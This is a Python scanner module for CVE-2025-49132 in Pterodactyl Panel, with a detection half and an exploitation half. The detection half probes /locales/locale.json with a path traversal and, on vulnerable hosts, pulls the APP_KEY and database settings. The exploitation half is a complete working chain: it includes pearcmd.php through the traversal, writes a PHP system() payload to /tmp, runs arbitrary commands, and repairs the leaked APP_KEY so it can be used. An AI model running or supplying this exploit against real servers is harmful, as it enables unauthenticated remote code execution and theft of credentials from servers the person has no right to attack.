#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2025-49132')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2025-49132 — Pterodactyl Panel unauthenticated RCE via /locales/locale.json (SAFE DETECTOR).

Pterodactyl <= 1.11.10 passes the `locale` and `namespace` query params straight into the Laravel
translation FileLoader (path = resources/lang/{locale}/{group}.php), so a traversal in `locale`
escapes the lang dir and require()s arbitrary PHP files, returning their data as JSON. Patched in
1.11.11 by a LocaleRequest FormRequest enforcing locale ^[a-z][a-z]$ and namespace ^[a-z]{1,191}$.

DETECTION DISCRIMINATOR (patched vs vulnerable — critical to avoid an FP on 1.11.11):
The endpoint EXISTS and returns JSON on BOTH vulnerable and patched installs, so "JSON + no hash="
is presence, NOT vulnerability. Instead we send a benign probe whose input the PATCH's regex
REJECTS — a `locale` containing traversal chars (`../`) — and read the BEHAVIOR:
  * vulnerable (<=1.11.10): no validation -> 200 + the request is PROCESSED (our crafted locale key
    is echoed in the JSON response, e.g. {"../../config": {...}}).
  * patched (>=1.11.11): LocaleRequest regex rejects it -> 422 (ValidationException), not processed.
We first use a NON-SENSITIVE probe (locale=../../config&namespace=app reaches config/app.php whose
array keys like "name"/"locale" are harmless to confirm processing) to prove the include primitive
is LIVE. Once confirmed, the detector also records APP_KEY disclosure if config/app.php yields it.
Exploitation keeps the command-capable PEAR/RCE chain separate and also captures APP_KEY/DB
disclosure artifacts when available.
"""

import json
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

_ENDPOINT = "/locales/locale.json"
# Traversal probe: locale carries the traversal (rejected by the patch regex ^[a-z][a-z]$),
# namespace is a benign config group. resources/lang/../../config/app.php is non-sensitive (its
# array keys are app name/locale/etc) — enough to prove the path is processed, not to leak a secret.
_PROBE_LOCALE = "../../config"
_PROBE_NS = "app"


def _get(session, url, **kw):
    try:
        return session.get(url, timeout=kw.pop("timeout", 10), verify=False,
                           allow_redirects=True, **kw)
    except requests.RequestException:
        return None


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()
    base = target_url.rstrip("/")
    if not base.startswith(("http://", "https://")):
        base = "http://" + base

    result = {
        "cve_id": "CVE-2025-49132",
        "name": "Pterodactyl Panel unauthenticated RCE (/locales/locale.json)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version_status": "unknown",
        "endpoint": base + _ENDPOINT,
        "evidence": [],
        "artifacts": {},
        "detection_methods": [],
    }

    # 1) endpoint present? (necessary but NOT sufficient — patched installs also have it)
    benign = _get(sess, f"{base}{_ENDPOINT}", params={"locale": "en", "namespace": "strings"})
    if benign is None or benign.status_code != 200:
        result["evidence"].append(f"{_ENDPOINT} not reachable / non-200")
        return result
    ct = (benign.headers.get("Content-Type") or "")
    if "json" not in ct.lower():
        result["evidence"].append(f"{_ENDPOINT} present but not JSON ({ct}) — not the Pterodactyl locale endpoint")
        return result
    result["evidence"].append(f"{_ENDPOINT} present (JSON) — endpoint exists")
    result["status"] = "surface_present"
    result["verdict"] = "surface_present"
    result["proof_type"] = "fingerprint"

    # 2) DISCRIMINATOR: send the traversal-carrying locale the patch regex would reject.
    probe = _get(sess, f"{base}{_ENDPOINT}", params={"locale": _PROBE_LOCALE, "namespace": _PROBE_NS})
    if probe is None:
        result["evidence"].append("traversal probe failed (no response)")
        return result

    # Patched (>=1.11.11): LocaleRequest validation -> 422. Edge hardening/WAF controls commonly
    # block traversal at the web server layer -> 403. Both are negative controls.
    if probe.status_code in (403, 422):
        result["version_status"] = "patched"
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "safe_active"
        result["detection_methods"].append("validation_rejected")
        if probe.status_code == 422:
            result["evidence"].append(
                "traversal locale rejected with HTTP 422 (LocaleRequest regex) — PATCHED (>=1.11.11)"
            )
        else:
            result["evidence"].append(
                "traversal locale blocked with HTTP 403 before include processing — hardened negative control"
            )
        return result

    # Vulnerable (<=1.11.10): no validation -> 200 and the crafted locale key is PROCESSED/echoed.
    if probe.status_code == 200:
        try:
            data = probe.json()
        except (ValueError, json.JSONDecodeError):
            data = None
        # The vulnerable controller builds $response[$locale][$namespace]=..., so our traversal
        # string appears as a top-level key in the JSON. That proves the param was processed unsanitized.
        if isinstance(data, dict) and _PROBE_LOCALE in data:
            result["vulnerable"] = True
            result["status"] = "confirmed_vulnerable"
            result["verdict"] = "confirmed_vulnerable"
            result["proof_type"] = "safe_active"
            result["version_status"] = "vulnerable"
            result["detection_methods"].append("unsanitized_traversal_processed")
            result["evidence"].append(
                f"traversal locale '{_PROBE_LOCALE}' processed unsanitized (200; echoed as a JSON key) "
                "— unauthenticated include/RCE primitive LIVE (<=1.11.10)")
            secrets, app_key = _collect_secrets(sess, base)
            if secrets:
                result["artifacts"]["secrets"] = secrets
                result["artifacts"]["lfi_request"] = f"GET {_ENDPOINT}?locale={_CFG_LOCALE}&namespace=app"
                result["detection_methods"].append("config_disclosure")
                if app_key:
                    result["artifacts"]["app_key"] = app_key
                    result["detection_methods"].append("app_key_disclosed")
                    result["evidence"].append(
                        f"APP_KEY disclosed via config/app.php include: {app_key}")
            return result
        result["evidence"].append("traversal probe returned 200 but locale key not echoed — inconclusive")
        return result

    result["evidence"].append(f"traversal probe returned HTTP {probe.status_code} — inconclusive")
    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2025-49132 exploitation half — Pterodactyl Panel unauthenticated RCE.

vuln_class = rce. The unauth /locales/locale.json traversal reaches Laravel FileLoader's
require() path. This exploit first uses that include primitive to include PEAR's pearcmd.php and
write a temporary PHP payload, then includes the payload through the same endpoint to execute the
operator's --command in-band. It also reads config/app.php and config/database.php as supporting
artifacts when the LFI disclosure path is available.

NOTE on the i18n mangling: Pterodactyl's locale endpoint post-processes Laravel `:foo` placeholders
into `{{foo}}`. base64's alphabet contains no colon, so the ONLY colon in `APP_KEY=base64:<...>` is
the `base64:` separator and exactly ONE transform fires: `base64:KEY` -> `base64{{KEY}}`. We reverse
that single `{{X}}` -> `:X` so artifacts["app_key"] carries a USABLE key (it would otherwise be a
mangled string that fails an AES-256 HMAC if a consumer tried to use it).

The PEAR path is environment-dependent. The module tries the lab/default PHP image locations and
accepts options={"pear_path": "..."} or options={"pear_dir": "..."} for non-default deployments.
success=True only when command output is observed between the exploit markers.

Detection half: modules/cves/cve_2025_49132.py.
"""

import re
import secrets as _secrets

import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

_ENDPOINT = "/locales/locale.json"
# Verified traversal: resources/lang/{locale}/{group}.php -> ../../config reaches /var/www/html/config.
_CFG_LOCALE = "../../config"
_TMP_LOCALE = "../../../../../../tmp"
_PEAR_DIRS = (
    "/usr/local/lib/php",
    "/usr/share/php",
    "/usr/share/php/PEAR",
    "/usr/share/pear",
    "/usr/lib/php",
    "/usr/lib/php/PEAR",
    "/opt/pear",
)


def _unmangle_app_key(raw: str) -> str:
    """Reverse the i18n placeholder transform on a leaked APP_KEY: base64{{X}} -> base64:X.
    Returns a usable `base64:...` key, or the input unchanged if no single-placeholder pattern."""
    if not raw:
        return raw
    m = re.search(r"base64\{\{([^}]*)\}\}([A-Za-z0-9+/=]*)", raw)
    if m:
        return "base64:" + m.group(1) + m.group(2)
    return raw


def _raw_get(endpoint_url: str, raw_query: str, *, timeout: int = 15, user_agent: str = None):
    """GET endpoint_url?raw_query without requoting the query string.

    The PEAR argv trick depends on literal leading '+' separators and raw PHP metacharacters. The
    regular requests API helpfully quotes those characters, so this narrow helper delegates to the
    central exact-byte transport. That transport still honors --proxy, -H, --trace-http, and request
    accounting.
    """
    return http_config.raw_http_get(
        endpoint_url,
        raw_query,
        timeout=timeout,
        headers={"User-Agent": user_agent or http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2025-49132"},
    )


def _candidate_pear_dirs(options):
    opts = options or {}
    candidates = []
    for key in ("pear_path", "pear_dir"):
        value = opts.get(key)
        if not value:
            continue
        value = str(value).strip()
        if value.endswith("/pearcmd.php"):
            value = value[: -len("/pearcmd.php")]
        candidates.append(value.rstrip("/"))
    candidates.extend(_PEAR_DIRS)
    seen = set()
    unique = []
    for candidate in candidates:
        if not candidate or candidate in seen:
            continue
        seen.add(candidate)
        unique.append(candidate)
    return unique


def _wrapped_command(command: str, marker: str) -> str:
    cmd = command or "echo CVE-2025-49132 PoC && id && hostname"
    return f"printf '{marker}_START\\n'; ({cmd}) 2>&1; printf '\\n{marker}_END\\n'"


def _php_system_payload(command: str, marker: str) -> str:
    return f"<?=system(hex2bin('{_wrapped_command(command, marker).encode().hex()}'))?>"


def _extract_marked_output(raw: str, marker: str) -> str | None:
    if not raw:
        return None
    m = re.search(
        rf"{re.escape(marker)}_START\s*(.*?)\s*{re.escape(marker)}_END",
        raw,
        flags=re.S,
    )
    if not m:
        return None
    out = m.group(1).strip()
    # PEAR config serialization can leak trailing path defaults after command output. Trim only the
    # known PEAR tails while preserving legitimate command output.
    for suffix in ("/pear/man", "/pear/php"):
        while out.endswith(suffix):
            out = out[: -len(suffix)].rstrip()
    lines = []
    seen = set()
    for line in out.splitlines():
        if line not in seen:
            seen.add(line)
            lines.append(line)
    return "\n".join(lines).strip()


def _lfi_json(session, base: str, group: str):
    try:
        r = session.get(
            f"{base}{_ENDPOINT}",
            params={"locale": _CFG_LOCALE, "namespace": group},
            timeout=15,
            verify=False,
        )
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except (ValueError, requests.exceptions.JSONDecodeError):
        return None


def _collect_secrets(session, base: str):
    secrets = {}
    app_key = None

    app_cfg = _lfi_json(session, base, "app")
    if isinstance(app_cfg, dict):
        blob = str(app_cfg)
        m = re.search(r"base64\{\{[^}]+\}\}[A-Za-z0-9+/=]*|base64:[A-Za-z0-9+/=]+", blob)
        if m:
            app_key = _unmangle_app_key(m.group(0))
            secrets["APP_KEY"] = app_key

    db_cfg = _lfi_json(session, base, "database")
    if isinstance(db_cfg, dict):
        blob = str(db_cfg)
        if "mysql" in blob:
            secrets["DB_CONNECTION"] = "mysql"
        for key in ("database", "username", "host"):
            mm = re.search(rf"'{key}'\s*=>\s*'([^']+)'", blob) or re.search(
                rf'"{key}"\s*:\s*"([^"]+)"',
                blob,
            )
            if mm:
                secrets[f"DB_{key.upper()}"] = mm.group(1)

    return secrets, app_key


def _attempt_pear_rce(base: str, command: str, options: dict | None):
    endpoint_url = f"{base}{_ENDPOINT}"
    timeout = int((options or {}).get("timeout", 15) or 15)
    token = _secrets.token_hex(6)
    marker = f"LVC49132{token.upper()}"
    payload_name = f"lvc49132_{token}"
    payload_path = f"/tmp/{payload_name}.php"
    php_payload = _php_system_payload(command, marker)
    attempts = []

    for pear_dir in _candidate_pear_dirs(options):
        traversal = "../../../../../../" + pear_dir.lstrip("/")
        create_query = (
            f"+config-create+/&locale={traversal}&namespace=pearcmd&"
            f"{php_payload}+{payload_path}"
        )
        try:
            create_status, create_body, _ = _raw_get(endpoint_url, create_query, timeout=timeout)
        except Exception as exc:
            attempts.append({"pear_dir": pear_dir, "stage": "create", "error": f"{type(exc).__name__}: {exc}"})
            continue

        exec_query = f"locale={_TMP_LOCALE}&namespace={payload_name}"
        try:
            exec_status, exec_body, _ = _raw_get(endpoint_url, exec_query, timeout=timeout)
        except Exception as exc:
            attempts.append({
                "pear_dir": pear_dir,
                "stage": "execute",
                "create_status": create_status,
                "error": f"{type(exc).__name__}: {exc}",
            })
            continue

        output = _extract_marked_output(exec_body, marker)
        attempt = {
            "pear_dir": pear_dir,
            "payload_path": payload_path,
            "create_status": create_status,
            "execute_status": exec_status,
            "create_body_head": (create_body or "")[:180],
            "execute_body_head": (exec_body or "")[:180],
        }
        attempts.append(attempt)
        if output:
            return {
                "success": True,
                "output": output,
                "pear_dir": pear_dir,
                "payload_path": payload_path,
                "create_status": create_status,
                "execute_status": exec_status,
                "marker": marker,
                "attempts": attempts,
            }

    return {"success": False, "attempts": attempts, "marker": marker, "payload_path": payload_path}


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None):
    """Unauthenticated LFI -> PEAR payload write -> in-band command execution. Never raises."""
    base = (target_url or "").rstrip("/")
    if base and not base.startswith(("http://", "https://")):
        base = "http://" + base
    result = {
        "cve": "CVE-2025-49132",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }
    if not base:
        result["attempted"] = False
        result["reason"] = "no target_url provided"
        return result

    s = session or http_config.get_auth_session()
    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2025-49132")

    secrets, app_key = _collect_secrets(s, base)
    if secrets:
        result["artifacts"]["secrets"] = secrets
        result["artifacts"]["lfi_request"] = f"GET {_ENDPOINT}?locale={_CFG_LOCALE}&namespace=app"
        if app_key:
            result["artifacts"]["app_key"] = app_key

    default_cmd = "echo CVE-2025-49132 PoC && id && hostname"
    rce = _attempt_pear_rce(base, command or default_cmd, options or {})
    result["artifacts"]["rce_attempts"] = rce.get("attempts", [])

    if rce.get("success"):
        result["success"] = True
        result["evidence"] = rce["output"]
        result["detail"] = (
            "Unauthenticated command execution via /locales/locale.json traversal into pearcmd.php, "
            "temporary payload creation, and in-band include of the generated PHP payload."
        )
        result["outcome_tag"] = "command-executed"
        result["command"] = command or default_cmd
        result["artifacts"].update({
            "pear_dir": rce.get("pear_dir"),
            "payload_path": rce.get("payload_path"),
            "create_status": rce.get("create_status"),
            "execute_status": rce.get("execute_status"),
            "marker": rce.get("marker"),
        })
        result["impact"] = (
            "Unauthenticated RCE: attacker-controlled locale/namespace traversal reaches PHP "
            "include/require, uses pearcmd.php to write a PHP payload, and executes arbitrary "
            "commands as the web server user."
        )
        return result

    if secrets:
        ev = "; ".join(f"{k}={v}" for k, v in secrets.items())
        result["evidence"] = f"RCE not confirmed; supporting LFI disclosure succeeded: {ev}"
        result["detail"] = (
            "The include primitive disclosed config secrets, but the PEAR command-execution chain did "
            "not return a marked command output."
        )
        result["outcome_tag"] = "secrets-disclosed"
        result["reason"] = (
            "RCE chain requires a reachable pearcmd.php (or equivalent PHP file-write primitive) and "
            "PHP argv handling for the web SAPI; disclosure succeeded but command output was not observed."
        )
        result["requires"] = [
            "pterodactyl <= 1.11.10 with /locales/locale.json reachable",
            "PEAR pearcmd.php reachable through the include path",
            "register_argc_argv-style query argv handling for pearcmd.php",
        ]
        return result

    result["reason"] = (
        "No RCE marker and no APP_KEY/DB config disclosed — target may be patched (>=1.11.11), "
        "blocked by edge controls, or missing the PEAR/argv RCE preconditions."
    )
    result["requires"] = [
        "pterodactyl <= 1.11.10 with /locales/locale.json reachable",
        "PEAR pearcmd.php reachable through the include path",
        "register_argc_argv-style query argv handling for pearcmd.php",
    ]
    result["detail"] = "no command output recovered via the locale include primitive"
    return result
